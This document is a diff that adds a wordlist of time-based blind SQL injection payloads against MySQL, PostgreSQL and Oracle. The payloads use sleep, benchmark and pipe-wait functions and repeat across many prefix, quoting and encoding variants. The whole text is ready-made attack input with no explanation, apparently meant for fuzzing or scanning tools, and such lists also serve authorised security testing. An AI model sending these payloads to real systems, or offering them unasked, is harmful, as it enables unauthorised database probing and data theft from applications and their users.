@@ -1,0 +1,1373 @@
+'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
+"XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR"Z
+X'XOR(if(now()=sysdate(),//sleep(10)//,0))XOR'X
+X'XOR(if(now()=sysdate(),(sleep(10)),0))XOR'X
+X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X
+'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
+(SELECT(0)FROM(SELECT(SLEEP(10)))a)
+'XOR(if(now()=sysdate(),sleep(10),0))OR'
+1 AND (SELECT(0)FROM(SELECT(SLEEP(10)))a)-- wXyW
+(SELECT * FROM (SELECT(SLEEP(10)))a)
+'%2b(select*from(select(sleep(10)))a)%2b'
+CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(10))END
+');(SELECT 4564 FROM PG_SLEEP(10))--
+["')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23"]
+DBMS_PIPE.RECEIVE_MESSAGE([INT],10) AND 'bar'='bar
+AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],10) AND 'bar'='bar
+1' AND (SELECT 6268 FROM (SELECT(SLEEP(10)))ghXo) AND 'IKlK'='IKlK
+(select*from(select(sleep(10)))a)
+'%2b(select*from(select(sleep(10)))a)%2b'
+*'XOR(if(2=2,sleep(10),0))OR'
+-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//
+'+(select*from(select(if(1=1,sleep(10),false)))a)+'
+2021 AND (SELECT 6868 FROM (SELECT(SLEEP(10)))IiOE)
+BENCHMARK(10000000,MD5(CHAR(116)))
+'%2bbenchmark(10000000,sha1(1))%2b'
+'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(10),1)))a)--%20 - true
+if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"/
+if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"/
+0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(10*1),0))XOR'Z
+if(now()=sysdate(),sleep(10),0)
+'XOR(if(now()=sysdate(),sleep(10),0))XOR'
+'XOR(if(now()=sysdate(),sleep(10*1),0))OR'
+0'|(IF((now())LIKE(sysdate()),SLEEP(10),0))|'Z
+(select(0)from(select(sleep(10)))v)
+'%2b(select*from(select(sleep(10)))a)%2b'
+(select*from(select(sleep(10)))a)
+1'%2b(select*from(select(sleep(10)))a)%2b'
+,(select * from (select(sleep(10)))a)
+desc%2c(select*from(select(sleep(10)))a)
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(10))A))
+'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:10') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1
+0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z
+XOR(if(now()=sysdate(),sleep(7),0))XOR%23
+;SELECT pg_sleep(10);
+;SELECT pg_sleep(10);
+SELECT pg_sleep(10);
+1 SELECT pg_sleep(10);
+or SELECT pg_sleep(10);
+(SELECT pg_sleep(10))
+pg_sleep(10)--
+1 or pg_sleep(10)--
+" or pg_sleep(10)--
+' or pg_sleep(10)--
+1) or pg_sleep(10)--
+") or pg_sleep(10)--
+') or pg_sleep(10)--
+1)) or pg_sleep(10)--
+")) or pg_sleep(10)--
+')) or pg_sleep(10)--
+pg_SLEEP(10)
+pg_SLEEP(10)--
+pg_SLEEP(10)#
+or pg_SLEEP(10)
+or pg_SLEEP(10)--
+or pg_SLEEP(10)#
+' SELECT pg_sleep(10);
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(10))
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(10))-- 1337
+1' AND 1337=(SELECT 1337 FROM PG_SLEEP(10)) AND '1337'='1337
+1') AND 1337=(SELECT 1337 FROM PG_SLEEP(10)) AND ('1337'='1337
+1) AND 1337=(SELECT 1337 FROM PG_SLEEP(10)) AND (1337=1337
+or pg_sleep(10)--
+) or pg_sleep(10)--
+)) or pg_sleep(10)--
+ and 1337=(select 1337 from pg_sleep(120))
+ and 1337=(select 1337 from pg_sleep(120)) -- 
+ or 1337=(select 1337 from pg_sleep(120))
+ or 1337=(select 1337 from pg_sleep(120)) -- 
+%00 and 1337=(select 1337 from pg_sleep(120))
+%00 and 1337=(select 1337 from pg_sleep(120)) -- 
+%00 or 1337=(select 1337 from pg_sleep(120))
+%00 or 1337=(select 1337 from pg_sleep(120)) -- 
+%00' and 1337=(select 1337 from pg_sleep(120)) -- 
+%00' or 1337=(select 1337 from pg_sleep(120)) -- 
+%00';select pg_sleep(120) -- 
+%00;select pg_sleep(120)
+%00;select pg_sleep(120) -- 
+%00\' and 1337=(select 1337 from pg_sleep(120)) -- 
+%00\' or 1337=(select 1337 from pg_sleep(120)) -- 
+%00\';select pg_sleep(120) -- 
+%00\\' and 1337=(select 1337 from pg_sleep(120)) -- 
+%00\\' or 1337=(select 1337 from pg_sleep(120)) -- 
+%00\\';select pg_sleep(120) -- 
+%0a and 1337=(select 1337 from pg_sleep(120))
+%0a and 1337=(select 1337 from pg_sleep(120)) -- 
+%0a or 1337=(select 1337 from pg_sleep(120))
+%0a or 1337=(select 1337 from pg_sleep(120)) -- 
+%0a' and 1337=(select 1337 from pg_sleep(120)) -- 
+%0a' or 1337=(select 1337 from pg_sleep(120)) -- 
+%0a';select pg_sleep(120) -- 
+%0a;select pg_sleep(120)
+%0a;select pg_sleep(120) -- 
+%0a\' and 1337=(select 1337 from pg_sleep(120)) -- 
+%0a\' or 1337=(select 1337 from pg_sleep(120)) -- 
+%0a\';select pg_sleep(120) -- 
+%0a\\' and 1337=(select 1337 from pg_sleep(120)) -- 
+%0a\\' or 1337=(select 1337 from pg_sleep(120)) -- 
+%0a\\';select pg_sleep(120) -- 
+%0d%0a and 1337=(select 1337 from pg_sleep(120))
+%0d%0a and 1337=(select 1337 from pg_sleep(120)) -- 
+%0d%0a or 1337=(select 1337 from pg_sleep(120))
+%0d%0a or 1337=(select 1337 from pg_sleep(120)) -- 
+%0d%0a' and 1337=(select 1337 from pg_sleep(120)) -- 
+%0d%0a' or 1337=(select 1337 from pg_sleep(120)) -- 
+%0d%0a';select pg_sleep(120) -- 
+%0d%0a;select pg_sleep(120)
+%0d%0a;select pg_sleep(120) -- 
+%0d%0a\' and 1337=(select 1337 from pg_sleep(120)) -- 
+%0d%0a\' or 1337=(select 1337 from pg_sleep(120)) -- 
+%0d%0a\';select pg_sleep(120) -- 
+%0d%0a\\' and 1337=(select 1337 from pg_sleep(120)) -- 
+%0d%0a\\' or 1337=(select 1337 from pg_sleep(120)) -- 
+%0d%0a\\';select pg_sleep(120) -- 
+' and 1337=(select 1337 from pg_sleep(120)) -- 
+' or 1337=(select 1337 from pg_sleep(120)) -- 
+';select pg_sleep(120) -- 
+0x00 and 1337=(select 1337 from pg_sleep(120))
+0x00 and 1337=(select 1337 from pg_sleep(120)) -- 
+0x00 or 1337=(select 1337 from pg_sleep(120))
+0x00 or 1337=(select 1337 from pg_sleep(120)) -- 
+0x00' and 1337=(select 1337 from pg_sleep(120)) -- 
+0x00' or 1337=(select 1337 from pg_sleep(120)) -- 
+0x00';select pg_sleep(120) -- 
+0x00;select pg_sleep(120)
+0x00;select pg_sleep(120) -- 
+0x00\' and 1337=(select 1337 from pg_sleep(120)) -- 
+0x00\' or 1337=(select 1337 from pg_sleep(120)) -- 
+0x00\';select pg_sleep(120) -- 
+0x00\\' and 1337=(select 1337 from pg_sleep(120)) -- 
+0x00\\' or 1337=(select 1337 from pg_sleep(120)) -- 
+0x00\\';select pg_sleep(120) -- 
+0x0a and 1337=(select 1337 from pg_sleep(120))
+0x0a and 1337=(select 1337 from pg_sleep(120)) -- 
+0x0a or 1337=(select 1337 from pg_sleep(120))
+0x0a or 1337=(select 1337 from pg_sleep(120)) -- 
+0x0a' and 1337=(select 1337 from pg_sleep(120)) -- 
+0x0a' or 1337=(select 1337 from pg_sleep(120)) -- 
+0x0a';select pg_sleep(120) -- 
+0x0a;select pg_sleep(120)
+0x0a;select pg_sleep(120) -- 
+0x0a\' and 1337=(select 1337 from pg_sleep(120)) -- 
+0x0a\' or 1337=(select 1337 from pg_sleep(120)) -- 
+0x0a\';select pg_sleep(120) -- 
+0x0a\\' and 1337=(select 1337 from pg_sleep(120)) -- 
+0x0a\\' or 1337=(select 1337 from pg_sleep(120)) -- 
+0x0a\\';select pg_sleep(120) -- 
+0x0d0a and 1337=(select 1337 from pg_sleep(120))
+0x0d0a and 1337=(select 1337 from pg_sleep(120)) -- 
+0x0d0a or 1337=(select 1337 from pg_sleep(120))
+0x0d0a or 1337=(select 1337 from pg_sleep(120)) -- 
+0x0d0a' and 1337=(select 1337 from pg_sleep(120)) -- 
+0x0d0a' or 1337=(select 1337 from pg_sleep(120)) -- 
+0x0d0a';select pg_sleep(120) -- 
+0x0d0a;select pg_sleep(120)
+0x0d0a;select pg_sleep(120) -- 
+0x0d0a\' and 1337=(select 1337 from pg_sleep(120)) -- 
+0x0d0a\' or 1337=(select 1337 from pg_sleep(120)) -- 
+0x0d0a\';select pg_sleep(120) -- 
+0x0d0a\\' and 1337=(select 1337 from pg_sleep(120)) -- 
+0x0d0a\\' or 1337=(select 1337 from pg_sleep(120)) -- 
+0x0d0a\\';select pg_sleep(120) -- 
+;select pg_sleep(120)
+;select pg_sleep(120) -- 
+\' and 1337=(select 1337 from pg_sleep(120)) -- 
+\' or 1337=(select 1337 from pg_sleep(120)) -- 
+\';select pg_sleep(120) -- 
+\\' and 1337=(select 1337 from pg_sleep(120)) -- 
+\\' or 1337=(select 1337 from pg_sleep(120)) -- 
+\\';select pg_sleep(120) -- 
+\\n and 1337=(select 1337 from pg_sleep(120))
+\\n and 1337=(select 1337 from pg_sleep(120)) -- 
+\\n or 1337=(select 1337 from pg_sleep(120))
+\\n or 1337=(select 1337 from pg_sleep(120)) -- 
+\\n' and 1337=(select 1337 from pg_sleep(120)) -- 
+\\n' or 1337=(select 1337 from pg_sleep(120)) -- 
+\\n';select pg_sleep(120) -- 
+\\n;select pg_sleep(120)
+\\n;select pg_sleep(120) -- 
+\\n\\' and 1337=(select 1337 from pg_sleep(120)) -- 
+\\n\\' or 1337=(select 1337 from pg_sleep(120)) -- 
+\\n\\';select pg_sleep(120) -- 
+\\r\\n and 1337=(select 1337 from pg_sleep(120))
+\\r\\n and 1337=(select 1337 from pg_sleep(120)) -- 
+\\r\\n or 1337=(select 1337 from pg_sleep(120))
+\\r\\n or 1337=(select 1337 from pg_sleep(120)) -- 
+\\r\\n' and 1337=(select 1337 from pg_sleep(120)) -- 
+\\r\\n' or 1337=(select 1337 from pg_sleep(120)) -- 
+\\r\\n';select pg_sleep(120) -- 
+\\r\\n;select pg_sleep(120)
+\\r\\n;select pg_sleep(120) -- 
+\\r\\n\\' and 1337=(select 1337 from pg_sleep(120)) -- 
+\\r\\n\\' or 1337=(select 1337 from pg_sleep(120)) -- 
+\\r\\n\\';select pg_sleep(120) -- 
+\n and 1337=(select 1337 from pg_sleep(120))
+\n and 1337=(select 1337 from pg_sleep(120)) -- 
+\n or 1337=(select 1337 from pg_sleep(120))
+\n or 1337=(select 1337 from pg_sleep(120)) -- 
+\n' and 1337=(select 1337 from pg_sleep(120)) -- 
+\n' or 1337=(select 1337 from pg_sleep(120)) -- 
+\n';select pg_sleep(120) -- 
+\n;select pg_sleep(120)
+\n;select pg_sleep(120) -- 
+\n\' and 1337=(select 1337 from pg_sleep(120)) -- 
+\n\' or 1337=(select 1337 from pg_sleep(120)) -- 
+\n\';select pg_sleep(120) -- 
+\r\n and 1337=(select 1337 from pg_sleep(120))
+\r\n and 1337=(select 1337 from pg_sleep(120)) -- 
+\r\n or 1337=(select 1337 from pg_sleep(120))
+\r\n or 1337=(select 1337 from pg_sleep(120)) -- 
+\r\n' and 1337=(select 1337 from pg_sleep(120)) -- 
+\r\n' or 1337=(select 1337 from pg_sleep(120)) -- 
+\r\n';select pg_sleep(120) -- 
+\r\n;select pg_sleep(120)
+\r\n;select pg_sleep(120) -- 
+\r\n\' and 1337=(select 1337 from pg_sleep(120)) -- 
+\r\n\' or 1337=(select 1337 from pg_sleep(120)) -- 
+\r\n\';select pg_sleep(120) -- 
+1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),10)
+1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),10)-- 1337
+' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),10) AND '1337'='1337
+') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),10) AND ('1337'='1337) 
+AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),10) AND (1337=1337
+ and 1337=dbms_pipe.receive_message(('a'),120)
+ and 1337=dbms_pipe.receive_message(('a'),120) -- 
+ and 1337=dbms_pipe.receive_message((\'a\'),120)
+ and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+ and 1337=dbms_pipe.receive_message((\\'a\\'),120)
+ and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+ and 1337=dbms_pipe.receive_message(1,120)
+ and 1337=dbms_pipe.receive_message(1,120) -- 
+ or 1337=dbms_pipe.receive_message(('a'),120)
+ or 1337=dbms_pipe.receive_message(('a'),120) -- 
+ or 1337=dbms_pipe.receive_message((\'a\'),120)
+ or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+ or 1337=dbms_pipe.receive_message((\\'a\\'),120)
+ or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+ or 1337=dbms_pipe.receive_message(1,120)
+ or 1337=dbms_pipe.receive_message(1,120) -- 
+%00 and 1337=dbms_pipe.receive_message(('a'),120)
+%00 and 1337=dbms_pipe.receive_message(('a'),120) -- 
+%00 and 1337=dbms_pipe.receive_message((\'a\'),120)
+%00 and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+%00 and 1337=dbms_pipe.receive_message((\\'a\\'),120)
+%00 and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+%00 and 1337=dbms_pipe.receive_message(1,120)
+%00 and 1337=dbms_pipe.receive_message(1,120) -- 
+%00 or 1337=dbms_pipe.receive_message(('a'),120)
+%00 or 1337=dbms_pipe.receive_message(('a'),120) -- 
+%00 or 1337=dbms_pipe.receive_message((\'a\'),120)
+%00 or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+%00 or 1337=dbms_pipe.receive_message((\\'a\\'),120)
+%00 or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+%00 or 1337=dbms_pipe.receive_message(1,120)
+%00 or 1337=dbms_pipe.receive_message(1,120) -- 
+%00' and 1337=dbms_pipe.receive_message(('a'),120) -- 
+%00' and 1337=dbms_pipe.receive_message(1,120) -- 
+%00' or 1337=dbms_pipe.receive_message(('a'),120) -- 
+%00' or 1337=dbms_pipe.receive_message(1,120) -- 
+%00';select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual  -- 
+%00';select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+%00;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual
+%00;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual -- 
+%00;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual
+%00;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+%00;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual
+%00;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual -- 
+%00;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual
+%00;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+%00\' and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+%00\' and 1337=dbms_pipe.receive_message(1,120) -- 
+%00\' or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+%00\' or 1337=dbms_pipe.receive_message(1,120) -- 
+%00\';select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual  -- 
+%00\';select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+%00\\' and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+%00\\' and 1337=dbms_pipe.receive_message(1,120) -- 
+%00\\' or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+%00\\' or 1337=dbms_pipe.receive_message(1,120) -- 
+%00\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual  -- 
+%00\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+%0a and 1337=dbms_pipe.receive_message(('a'),120)
+%0a and 1337=dbms_pipe.receive_message(('a'),120) -- 
+%0a and 1337=dbms_pipe.receive_message((\'a\'),120)
+%0a and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+%0a and 1337=dbms_pipe.receive_message((\\'a\\'),120)
+%0a and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+%0a and 1337=dbms_pipe.receive_message(1,120)
+%0a and 1337=dbms_pipe.receive_message(1,120) -- 
+%0a or 1337=dbms_pipe.receive_message(('a'),120)
+%0a or 1337=dbms_pipe.receive_message(('a'),120) -- 
+%0a or 1337=dbms_pipe.receive_message((\'a\'),120)
+%0a or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+%0a or 1337=dbms_pipe.receive_message((\\'a\\'),120)
+%0a or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+%0a or 1337=dbms_pipe.receive_message(1,120)
+%0a or 1337=dbms_pipe.receive_message(1,120) -- 
+%0a' and 1337=dbms_pipe.receive_message(('a'),120) -- 
+%0a' and 1337=dbms_pipe.receive_message(1,120) -- 
+%0a' or 1337=dbms_pipe.receive_message(('a'),120) -- 
+%0a' or 1337=dbms_pipe.receive_message(1,120) -- 
+%0a';select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual  -- 
+%0a';select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+%0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual
+%0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual -- 
+%0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual
+%0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+%0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual
+%0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual -- 
+%0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual
+%0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+%0a\' and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+%0a\' and 1337=dbms_pipe.receive_message(1,120) -- 
+%0a\' or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+%0a\' or 1337=dbms_pipe.receive_message(1,120) -- 
+%0a\';select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual  -- 
+%0a\';select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+%0a\\' and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+%0a\\' and 1337=dbms_pipe.receive_message(1,120) -- 
+%0a\\' or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+%0a\\' or 1337=dbms_pipe.receive_message(1,120) -- 
+%0a\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual  -- 
+%0a\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+%0d%0a and 1337=dbms_pipe.receive_message(('a'),120)
+%0d%0a and 1337=dbms_pipe.receive_message(('a'),120) -- 
+%0d%0a and 1337=dbms_pipe.receive_message((\'a\'),120)
+%0d%0a and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+%0d%0a and 1337=dbms_pipe.receive_message((\\'a\\'),120)
+%0d%0a and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+%0d%0a and 1337=dbms_pipe.receive_message(1,120)
+%0d%0a and 1337=dbms_pipe.receive_message(1,120) -- 
+%0d%0a or 1337=dbms_pipe.receive_message(('a'),120)
+%0d%0a or 1337=dbms_pipe.receive_message(('a'),120) -- 
+%0d%0a or 1337=dbms_pipe.receive_message((\'a\'),120)
+%0d%0a or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+%0d%0a or 1337=dbms_pipe.receive_message((\\'a\\'),120)
+%0d%0a or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+%0d%0a or 1337=dbms_pipe.receive_message(1,120)
+%0d%0a or 1337=dbms_pipe.receive_message(1,120) -- 
+%0d%0a' and 1337=dbms_pipe.receive_message(('a'),120) -- 
+%0d%0a' and 1337=dbms_pipe.receive_message(1,120) -- 
+%0d%0a' or 1337=dbms_pipe.receive_message(('a'),120) -- 
+%0d%0a' or 1337=dbms_pipe.receive_message(1,120) -- 
+%0d%0a';select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual  -- 
+%0d%0a';select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+%0d%0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual
+%0d%0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual -- 
+%0d%0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual
+%0d%0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+%0d%0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual
+%0d%0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual -- 
+%0d%0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual
+%0d%0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+%0d%0a\' and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+%0d%0a\' and 1337=dbms_pipe.receive_message(1,120) -- 
+%0d%0a\' or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+%0d%0a\' or 1337=dbms_pipe.receive_message(1,120) -- 
+%0d%0a\';select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual  -- 
+%0d%0a\';select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+%0d%0a\\' and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+%0d%0a\\' and 1337=dbms_pipe.receive_message(1,120) -- 
+%0d%0a\\' or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+%0d%0a\\' or 1337=dbms_pipe.receive_message(1,120) -- 
+%0d%0a\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual  -- 
+%0d%0a\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+' and 1337=dbms_pipe.receive_message(('a'),120) -- 
+' and 1337=dbms_pipe.receive_message(1,120) -- 
+' or 1337=dbms_pipe.receive_message(('a'),120) -- 
+' or 1337=dbms_pipe.receive_message(1,120) -- 
+';select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual  -- 
+';select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+0x00 and 1337=dbms_pipe.receive_message(('a'),120)
+0x00 and 1337=dbms_pipe.receive_message(('a'),120) -- 
+0x00 and 1337=dbms_pipe.receive_message((\'a\'),120)
+0x00 and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+0x00 and 1337=dbms_pipe.receive_message((\\'a\\'),120)
+0x00 and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+0x00 and 1337=dbms_pipe.receive_message(1,120)
+0x00 and 1337=dbms_pipe.receive_message(1,120) -- 
+0x00 or 1337=dbms_pipe.receive_message(('a'),120)
+0x00 or 1337=dbms_pipe.receive_message(('a'),120) -- 
+0x00 or 1337=dbms_pipe.receive_message((\'a\'),120)
+0x00 or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+0x00 or 1337=dbms_pipe.receive_message((\\'a\\'),120)
+0x00 or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+0x00 or 1337=dbms_pipe.receive_message(1,120)
+0x00 or 1337=dbms_pipe.receive_message(1,120) -- 
+0x00' and 1337=dbms_pipe.receive_message(('a'),120) -- 
+0x00' and 1337=dbms_pipe.receive_message(1,120) -- 
+0x00' or 1337=dbms_pipe.receive_message(('a'),120) -- 
+0x00' or 1337=dbms_pipe.receive_message(1,120) -- 
+0x00';select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual  -- 
+0x00';select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+0x00;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual
+0x00;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual -- 
+0x00;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual
+0x00;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+0x00;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual
+0x00;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual -- 
+0x00;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual
+0x00;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+0x00\' and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+0x00\' and 1337=dbms_pipe.receive_message(1,120) -- 
+0x00\' or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+0x00\' or 1337=dbms_pipe.receive_message(1,120) -- 
+0x00\';select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual  -- 
+0x00\';select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+0x00\\' and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+0x00\\' and 1337=dbms_pipe.receive_message(1,120) -- 
+0x00\\' or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+0x00\\' or 1337=dbms_pipe.receive_message(1,120) -- 
+0x00\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual  -- 
+0x00\\';select case when 29=29 then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+0x0a and 1337=dbms_pipe.receive_message(('a'),120)
+0x0a and 1337=dbms_pipe.receive_message(('a'),120) -- 
+0x0a and 1337=dbms_pipe.receive_message((\'a\'),120)
+0x0a and 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+0x0a and 1337=dbms_pipe.receive_message((\\'a\\'),120)
+0x0a and 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+0x0a and 1337=dbms_pipe.receive_message(1,120)
+0x0a and 1337=dbms_pipe.receive_message(1,120) -- 
+0x0a or 1337=dbms_pipe.receive_message(('a'),120)
+0x0a or 1337=dbms_pipe.receive_message(('a'),120) -- 
+0x0a or 1337=dbms_pipe.receive_message((\'a\'),120)
+0x0a or 1337=dbms_pipe.receive_message((\'a\'),120) -- 
+0x0a or 1337=dbms_pipe.receive_message((\\'a\\'),120)
+0x0a or 1337=dbms_pipe.receive_message((\\'a\\'),120) -- 
+0x0a or 1337=dbms_pipe.receive_message(1,120)
+0x0a or 1337=dbms_pipe.receive_message(1,120) -- 
+0x0a' and 1337=dbms_pipe.receive_message(('a'),120) -- 
+0x0a' and 1337=dbms_pipe.receive_message(1,120) -- 
+0x0a' or 1337=dbms_pipe.receive_message(('a'),120) -- 
+0x0a' or 1337=dbms_pipe.receive_message(1,120) -- 
+0x0a';select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual  -- 
+0x0a';select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual  -- 
+0x0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual
+0x0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual -- 
+0x0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual
+0x0a;select case when 29=29 then 'a'||dbms_pipe.receive_message(1,120) else null end from dual -- 
+0x0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual
+0x0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual -- 
+0x0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual
+0x0a;select case when 29=29 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual -- 
